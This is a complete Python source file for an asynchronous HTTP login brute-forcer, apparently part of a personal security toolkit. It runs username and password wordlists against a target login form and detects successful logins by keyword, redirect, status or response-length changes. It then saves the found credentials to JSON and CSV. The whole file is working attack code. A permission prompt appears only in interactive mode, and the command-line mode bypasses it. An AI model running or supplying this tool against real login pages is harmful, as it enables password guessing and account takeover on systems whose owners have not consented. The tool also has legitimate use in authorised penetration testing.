#!/usr/bin/env python3
"""
Brute-ForceScan.py - Advanced HTTP Login Brute-Forcer for PYSINT Suite
Author: Mael
License: MIT
Repository: ~/PYToolKit

Features:
- POST/GET method support
- Concurrent async requests
- Success detection via: keyword, redirect, status change, content length change
- Baseline auto-detection
- JSON/CSV output
- Debug mode (--debug)
- Help (--help) — NATIVE argparse (no manual -h)
- Safe file handling
"""

import os
import csv
import json
import asyncio
import httpx
import time
import argparse
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table

console = Console()

# ================== DEFAULTS ==================
DEFAULT_MAX_CONCURRENT = 10
DEFAULT_TIMEOUT = 10.0
DEFAULT_RETRIES = 2
DEFAULT_BACKOFF = 1.0
DEFAULT_RESULTS_DIR = Path(os.path.expanduser("~/PYSINT/results"))
DEFAULT_DELAY_BETWEEN = 0.0

# Ensure results dir exists
DEFAULT_RESULTS_DIR.mkdir(parents=True, exist_ok=True)


# ================== CORE FUNCTION ==================
async def attempt_login(
    client: httpx.AsyncClient,
    url: str,
    username: str,
    password: str,
    semaphore: asyncio.Semaphore,
    method: str,
    data_field_user: str,
    data_field_pass: str,
    extra_data: dict,
    success_check: dict,
    timeout: float,
    retries: int,
    backoff: float,
    debug: bool = False
):
    async with semaphore:
        for attempt in range(retries + 1):
            try:
                if method.upper() == "POST":
                    form = {data_field_user: username, data_field_pass: password}
                    if extra_data:
                        form.update(extra_data)
                    resp = await client.post(url, data=form, timeout=timeout)
                else:  # GET
                    params = {data_field_user: username, data_field_pass: password}
                    if extra_data:
                        params.update(extra_data)
                    resp = await client.get(url, params=params, timeout=timeout)

                # === Success Detection Heuristics ===
                # 1. Keyword in response
                keyword = success_check.get("keyword")
                if keyword and keyword.lower() in resp.text.lower():
                    if debug:
                        console.print(f"[DEBUG] Success by keyword: '{keyword}' in response for {username}:{password}")
                    return {
                        "username": username,
                        "password": password,
                        "status": resp.status_code,
                        "reason": f"keyword:{keyword}",
                        "response_length": len(resp.text)
                    }

                # 2. Redirect occurred
                if success_check.get("allow_redirect") and resp.history:
                    if debug:
                        console.print(f"[DEBUG] Success by redirect for {username}:{password}")
                    return {
                        "username": username,
                        "password": password,
                        "status": resp.status_code,
                        "reason": "redirect",
                        "response_length": len(resp.text)
                    }

                # 3. Status code changed from baseline
                baseline_status = success_check.get("baseline_status")
                if baseline_status is not None and resp.status_code != baseline_status:
                    if debug:
                        console.print(f"[DEBUG] Success by status change: {baseline_status} -> {resp.status_code} for {username}:{password}")
                    return {
                        "username": username,
                        "password": password,
                        "status": resp.status_code,
                        "reason": f"status_change:{baseline_status}->{resp.status_code}",
                        "response_length": len(resp.text)
                    }

                # 4. Response length changed significantly
                baseline_len = success_check.get("baseline_len")
                if baseline_len is not None:
                    diff = abs(len(resp.text) - baseline_len)
                    pct = (diff / max(1, baseline_len)) * 100
                    len_threshold_pct = success_check.get("len_threshold_pct", 20)
                    if pct >= len_threshold_pct:
                        if debug:
                            console.print(f"[DEBUG] Success by length diff: {pct:.1f}% for {username}:{password}")
                        return {
                            "username": username,
                            "password": password,
                            "status": resp.status_code,
                            "reason": f"len_diff:{pct:.1f}%",
                            "response_length": len(resp.text)
                        }

                return None  # No success detected

            except (httpx.RequestError, httpx.ReadTimeout) as e:
                if debug:
                    console.print(f"[DEBUG] Request error for {username}:{password} (attempt {attempt + 1}): {e}")
                if attempt < retries:
                    await asyncio.sleep(backoff * (attempt + 1))
                    continue
                return {
                    "username": username,
                    "password": password,
                    "status": None,
                    "reason": "request_error",
                    "error": str(e)
                }
            except Exception as e:
                if debug:
                    console.print(f"[DEBUG] Unexpected error for {username}:{password}: {e}")
                return {
                    "username": username,
                    "password": password,
                    "status": None,
                    "reason": f"error:{type(e).__name__}",
                    "error": str(e)
                }


# ================== MAIN BRUTEFORCE RUNNER ==================
async def run_bruteforce(
    target_url: str,
    usernames: list,
    passwords: list,
    method: str,
    data_field_user: str,
    data_field_pass: str,
    extra_data: dict,
    max_concurrent: int,
    timeout: float,
    retries: int,
    backoff: float,
    success_check: dict,
    delay_between: float,
    debug: bool = False
):
    sem = asyncio.Semaphore(max_concurrent)
    results = []
    combos = len(usernames) * len(passwords)

    client_timeout = httpx.Timeout(timeout)
    async with httpx.AsyncClient(follow_redirects=True, timeout=client_timeout) as client:
        tasks = []
        for u in usernames:
            for p in passwords:
                task = attempt_login(
                    client, target_url, u, p, sem, method,
                    data_field_user, data_field_pass, extra_data,
                    success_check, timeout, retries, backoff, debug
                )
                tasks.append(task)
                if delay_between > 0:
                    await asyncio.sleep(delay_between)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total} combos"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task_id = progress.add_task("[cyan]Trying combinations...", total=combos)
            for coro in asyncio.as_completed(tasks):
                res = await coro
                progress.advance(task_id)
                if res and "reason" in res and not res["reason"].startswith(("request_error", "error:")):
                    results.append(res)
                    console.print(f"[bold green]SUCCESS:[/bold green] {res['username']}:{res['password']} — {res['reason']}")
    return results


# ================== UTILS ==================
def load_wordlist(file_path: str, limit: int = 0):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
            return lines[:limit] if limit > 0 else lines
    except FileNotFoundError:
        console.print(f"[red]Wordlist not found: {file_path}[/red]")
        return []
    except Exception as e:
        console.print(f"[red]Error reading wordlist {file_path}: {e}[/red]")
        return []


def save_results_json_csv(results: list, prefix: str = "bruteforce", results_dir: Path = DEFAULT_RESULTS_DIR):
    now = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    json_path = results_dir / f"{prefix}_{now}.json"
    csv_path = results_dir / f"{prefix}_{now}.csv"

    # Save JSON
    try:
        with open(json_path, "w", encoding="utf-8") as jf:
            json.dump(results, jf, indent=2, ensure_ascii=False)
    except Exception as e:
        console.print(f"[red]Failed to save JSON: {e}[/red]")
        return None, None

    # Save CSV only if results exist
    if results:
        try:
            with open(csv_path, "w", newline="", encoding="utf-8") as cf:
                fieldnames = ["username", "password", "status", "reason", "response_length", "error"]
                writer = csv.DictWriter(cf, fieldnames=fieldnames)
                writer.writeheader()
                for r in results:
                    # Ensure all keys exist
                    row = {key: r.get(key, "") for key in fieldnames}
                    writer.writerow(row)
        except Exception as e:
            console.print(f"[red]Failed to save CSV: {e}[/red]")
            csv_path = None

    return json_path, csv_path


def describe_success_check(success_keyword: str, baseline_status: int, baseline_len: int, len_threshold_pct: int, allow_redirect: bool):
    parts = []
    if success_keyword:
        parts.append(f"keyword='{success_keyword}'")
    if baseline_status is not None:
        parts.append(f"baseline_status={baseline_status}")
    if baseline_len is not None:
        parts.append(f"baseline_len={baseline_len},len_threshold_pct={len_threshold_pct}%")
    if allow_redirect:
        parts.append("redirects considered success")
    return ", ".join(parts) if parts else "No special success heuristics (use keyword or baseline detection for reliability)"


# ================== ARGUMENT PARSER ==================
def parse_args():
    parser = argparse.ArgumentParser(
        description="PYSINT Brute-Force Scanner — HTTP Login Brute-Forcer",
        epilog="Example: python3 Brute-ForceScan.py --url https://example.com/login --userlist users.txt --passlist pass.txt --method POST"
    )
    parser.add_argument("--url", "-u", help="Target login URL (e.g., https://example.com/login)")
    parser.add_argument("--method", "-m", choices=["POST", "GET"], default="POST", help="HTTP method (default: POST)")
    parser.add_argument("--user-field", default="username", help="Username form field name (default: username)")
    parser.add_argument("--pass-field", default="password", help="Password form field name (default: password)")
    parser.add_argument("--extra-data", help="Extra form fields as JSON string (e.g., '{\"csrf\":\"token123\"}')")
    parser.add_argument("--userlist", required=True, help="Path to username wordlist")
    parser.add_argument("--passlist", required=True, help="Path to password wordlist")
    parser.add_argument("--max-users", type=int, default=0, help="Max usernames to try (0 = all)")
    parser.add_argument("--max-pass", type=int, default=0, help="Max passwords to try (0 = all)")
    parser.add_argument("--success-keyword", help="Keyword indicating successful login")
    parser.add_argument("--allow-redirect", action="store_true", help="Treat redirects as success")
    parser.add_argument("--no-baseline", action="store_true", help="Skip auto-baseline detection")
    parser.add_argument("--concurrent", type=int, default=DEFAULT_MAX_CONCURRENT, help=f"Max concurrent requests (default: {DEFAULT_MAX_CONCURRENT})")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help=f"Retries on failure (default: {DEFAULT_RETRIES})")
    parser.add_argument("--backoff", type=float, default=DEFAULT_BACKOFF, help=f"Backoff multiplier (default: {DEFAULT_BACKOFF})")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY_BETWEEN, help=f"Delay between requests (default: {DEFAULT_DELAY_BETWEEN})")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    # ✅ REMOVIDO: --help manual — argparse já inclui por padrão

    return parser.parse_args()


# ================== MAIN ==================
def main():
    args = parse_args()

    console.rule("[bold green]PYSINT Brute-Force Scanner[/bold green]")
    console.print("[yellow]Legal / Ethical reminder:[/yellow] Use this tool only on systems you own or have explicit permission to test.")

    if not args.url:
        confirm = Prompt.ask("Type [bold red]I HAVE PERMISSION[/bold red] to continue").strip()
        if confirm != "I HAVE PERMISSION":
            console.print("[red]Permission not granted. Exiting.[/red]")
            return

        # Interactive mode
        target_url = Prompt.ask("Login URL (full, e.g. https://example.com/login )").strip()
        method = Prompt.ask("HTTP method to use", choices=["POST", "GET"], default="POST")
        field_user = Prompt.ask("Form field name for username", default="username")
        field_pass = Prompt.ask("Form field name for password", default="password")

        extra_raw = Prompt.ask("Extra form fields as JSON (or leave blank)", default="")
        extra_data = {}
        if extra_raw:
            try:
                extra_data = json.loads(extra_raw)
            except Exception as e:
                console.print(f"[yellow]Could not parse JSON for extra fields: {e}. Ignoring extras.[/yellow]")

        userlist = Prompt.ask("Path to username wordlist", default="usernames.txt")
        passlist = Prompt.ask("Path to password wordlist", default="passwords.txt")
        max_users = int(Prompt.ask("Max usernames to try (0 = all)", default="0"))
        max_pass = int(Prompt.ask("Max passwords to try (0 = all)", default="0"))

        console.print("\n[bold]Success detection options[/bold]")
        success_keyword = Prompt.ask("Success keyword (leave blank to use baseline detection)", default="")
        allow_redirect = Confirm.ask("Consider redirects as success?", default=True)

        baseline_status = None
        baseline_len = None
        len_threshold_pct = 20

        if not success_keyword and not args.no_baseline:
            console.print("[cyan]Fetching baseline response to detect status/length changes...[/cyan]")
            try:
                with httpx.Client(follow_redirects=True, timeout=args.timeout) as baseline_client:
                    if method.upper() == "POST":
                        baseline_resp = baseline_client.post(target_url, data={field_user: "", field_pass: ""})
                    else:
                        baseline_resp = baseline_client.get(target_url)
                    baseline_status = baseline_resp.status_code
                    baseline_len = len(baseline_resp.text)
                    console.print(f"[green]Captured baseline: status={baseline_status}, len={baseline_len} chars[/green]")
            except Exception as e:
                console.print(f"[yellow]Could not fetch baseline: {e}. Baseline detection disabled.[/yellow]")

        max_concurrent = int(Prompt.ask("Max concurrent requests", default=str(args.concurrent)))
        timeout = float(Prompt.ask("Request timeout seconds", default=str(args.timeout)))
        retries = int(Prompt.ask("Request retries (on failure)", default=str(args.retries)))
        backoff = float(Prompt.ask("Backoff multiplier seconds", default=str(args.backoff)))
        delay_between = float(Prompt.ask("Delay between combo submissions (seconds, 0 = none)", default=str(args.delay)))

    else:
        # CLI mode
        target_url = args.url
        method = args.method
        field_user = args.user_field
        field_pass = args.pass_field
        extra_data = {}
        if args.extra_data:
            try:
                extra_data = json.loads(args.extra_data)
            except Exception as e:
                console.print(f"[red]Invalid JSON for --extra-data: {e}[/red]")
                return

        userlist = args.userlist
        passlist = args.passlist
        max_users = args.max_users
        max_pass = args.max_pass

        success_keyword = args.success_keyword
        allow_redirect = args.allow_redirect

        baseline_status = None
        baseline_len = None
        len_threshold_pct = 20

        if not success_keyword and not args.no_baseline:
            console.print("[cyan]Fetching baseline response...[/cyan]")
            try:
                with httpx.Client(follow_redirects=True, timeout=args.timeout) as baseline_client:
                    if method.upper() == "POST":
                        baseline_resp = baseline_client.post(target_url, data={field_user: "", field_pass: ""})
                    else:
                        baseline_resp = baseline_client.get(target_url)
                    baseline_status = baseline_resp.status_code
                    baseline_len = len(baseline_resp.text)
                    console.print(f"[green]Baseline: status={baseline_status}, len={baseline_len}[/green]")
            except Exception as e:
                console.print(f"[yellow]Baseline fetch failed: {e}[/yellow]")

        max_concurrent = args.concurrent
        timeout = args.timeout
        retries = args.retries
        backoff = args.backoff
        delay_between = args.delay

    # Load wordlists
    usernames = load_wordlist(userlist, max_users)
    passwords = load_wordlist(passlist, max_pass)

    if not usernames or not passwords:
        console.print("[red]Wordlists invalid or empty. Exiting.[/red]")
        return

    success_check = {
        "keyword": success_keyword.strip() if success_keyword else None,
        "baseline_status": baseline_status,
        "baseline_len": baseline_len,
        "len_threshold_pct": len_threshold_pct,
        "allow_redirect": allow_redirect,
    }

    console.print(f"\n[cyan]Starting brute-force against {target_url}[/cyan]")
    console.print(f"[cyan]Success detection: {describe_success_check(success_check['keyword'], baseline_status, baseline_len, len_threshold_pct, allow_redirect)}[/cyan]")
    console.print(f"[cyan]Combos to try: {len(usernames) * len(passwords)}[/cyan]\n")

    start_time = time.time()
    results = asyncio.run(
        run_bruteforce(
            target_url, usernames, passwords,
            method, field_user, field_pass, extra_data,
            max_concurrent, timeout, retries, backoff,
            success_check, delay_between, args.debug
        )
    )
    duration = time.time() - start_time

    console.print(f"\n[bold green]Finished in {duration:.1f}s — successes: {len(results)}[/bold green]")

    json_path, csv_path = save_results_json_csv(results, prefix="bruteforce")
    if json_path:
        console.print(f"[green]Results saved to:[/green] {json_path}" + (f", {csv_path}" if csv_path else ""))

    if results:
        table = Table(title="Successful Logins Found")
        table.add_column("Username", style="cyan")
        table.add_column("Password", style="magenta")
        table.add_column("HTTP Status", style="green")
        table.add_column("Reason", style="yellow")
        for r in results:
            table.add_row(
                r["username"],
                r["password"],
                str(r.get("status", "")),
                str(r.get("reason", ""))
            )
        console.print(table)


if __name__ == "__main__":
    main()
